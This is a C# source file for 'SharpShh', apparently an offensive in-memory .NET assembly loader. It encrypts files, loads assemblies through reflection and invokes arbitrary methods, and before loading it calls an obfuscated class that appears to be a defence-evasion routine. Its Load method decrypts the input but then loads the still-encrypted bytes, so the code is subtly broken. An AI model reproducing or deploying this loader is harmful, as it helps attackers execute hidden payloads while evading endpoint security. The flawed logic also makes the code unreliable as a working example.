using SharpShh.Modules;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using CommandLine;
using System.Reflection;
using PMTOWXCKRL;

namespace SharpShh
{
    public class Program
    {
        private static bool IsRunning = true;

        static void Main(string[] args)
        {
            while (IsRunning)
            {
                if(args == null)
                {
                    Console.WriteLine("");
                    Console.WriteLine("Command: ");
                    Console.WriteLine("");

                    args = Console.ReadLine().Split(' ');
                }

                try
                {

                Parser.Default.ParseArguments<EncryptOptions, LoadOptions, ExecuteOptions, ExitOptions>(args)
                    .MapResult(
                        (EncryptOptions options) => Encrypt(options),
                        (LoadOptions options) => Load(options),
                        (ExecuteOptions options) => Execute(options),
                        (ExitOptions options) => Exit(options),
                        errors => false
                    );
                } catch(Exception e)
                {
                    Console.WriteLine(e);
                }

                args = null;
            }
        }

        public static bool Load(LoadOptions options)
        {
            var encrypted = File.ReadAllBytes(options.InputFile);

            CWZUEIZXFO.SKDHQOJUWA();

            var decrypted = Crypto.Decrypt(encrypted, options.Key, options.IV);

            var assembly = Assembly.Load(encrypted);

            Console.WriteLine("Successfully loaded:\n\t{0}", assembly.FullName);

            return true;
        }

        public static bool Execute(ExecuteOptions options)
        {
            var assembly = AppDomain.CurrentDomain.GetAssemblies().SingleOrDefault(a => a.GetName().Name.Equals(options.Assembly, StringComparison.OrdinalIgnoreCase));

            // If its still null we let the user know
            if (assembly == null)
            {
                Console.WriteLine("Unable to find assembly {0}", assembly);

                Console.WriteLine("\tAvailable assemblies:");
                foreach (var a in AppDomain.CurrentDomain.GetAssemblies())
                {
                    Console.WriteLine("\t\t| {0}", a.GetName().Name);
                }

                return false;
            }

            var @namespace = assembly.GetTypes().FirstOrDefault(t => t.FullName.Equals(string.Format("{0}.{1}", options.Assembly, options.Type), StringComparison.OrdinalIgnoreCase));

            if (@namespace == null)
            {
                Console.WriteLine("Unable to find type {0} in assembly: {1}", options.Type, assembly);

                Console.WriteLine("\tAvailable types:");
                foreach (var t in assembly.GetTypes())
                {
                    Console.WriteLine("\t\t| {0}", t.Name);
                }

                return false;
            }

            var methodName = options.Method.Split('.').Last();
            var method = @namespace.GetMethods()
                .FirstOrDefault(m => m.Name.Equals(methodName, StringComparison.OrdinalIgnoreCase) 
                    && m.GetParameters().Length == options.Parameters.Count());

            if (method == null)
            {
                Console.WriteLine("Unable to find method {0} with {1} parameters in type: {2}", methodName, options.Parameters.Count(), options.Type);

                Console.WriteLine("\tAvailable methods:");
                foreach (var t in assembly.GetTypes())
                {
                    Console.WriteLine("\t\t| {0}", t.Name);
                }

                return false;
            }
            var parameters = options.Parameters?.ToArray();

            var result = method.Invoke(null, parameters);

            Console.WriteLine(result);

            return true;
        }

        static bool Encrypt(EncryptOptions options)
        {
            var input = File.ReadAllBytes(options.InputFile);

            var encrypted = Crypto.Encrypt(input, out var key, out var iv);

            File.WriteAllBytes(options.OutputFile, encrypted);

            Console.WriteLine("Encrypting: {0}", options.InputFile);
            Console.WriteLine("\tKey:\t {0}", Crypto.Base64Encode(key));
            Console.WriteLine("\tIV:\t {0}", Crypto.Base64Encode(iv));
            Console.WriteLine("\tOutput:\t {0}", options.OutputFile);

            return true;
        }

        public static bool Exit(ExitOptions options)
        {
            IsRunning = false;

            return true;
        }


    }
}
